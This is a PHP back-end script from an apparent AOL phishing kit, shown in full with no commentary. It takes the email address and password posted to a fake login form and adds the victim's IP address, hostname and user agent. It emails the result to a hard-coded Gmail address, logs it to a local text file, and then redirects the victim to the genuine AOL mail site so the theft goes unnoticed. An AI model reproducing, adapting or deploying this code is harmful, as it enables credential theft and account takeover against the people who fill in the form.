<?php
if($_POST["user"] != "" and $_POST["suspass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------AOL Info-----------------------\n";
$message .= "Email Address           : ".$_POST['user']."\n";
$message .= "Password           : ".$_POST['suspass']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- AOL USA [.] COM --------------|\n";
$send = "orozxj@gmail.com";
$subject = "AOL Wire Management | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);

$fp = fopen("../open.txt","a");
fputs($fp,$message);
fclose($fp);
$ps = $_POST['chck'];
if($ps){
  header ("Location: https://mail.aol.com/webmail-std/en-us/DisplayMessage?ws_popup=true&ws_suite=true");
}else{
header ("Location: index.html?chck=true&email=".$_POST['user']);	
}
}else{
header ("Location: index.html");
}

?>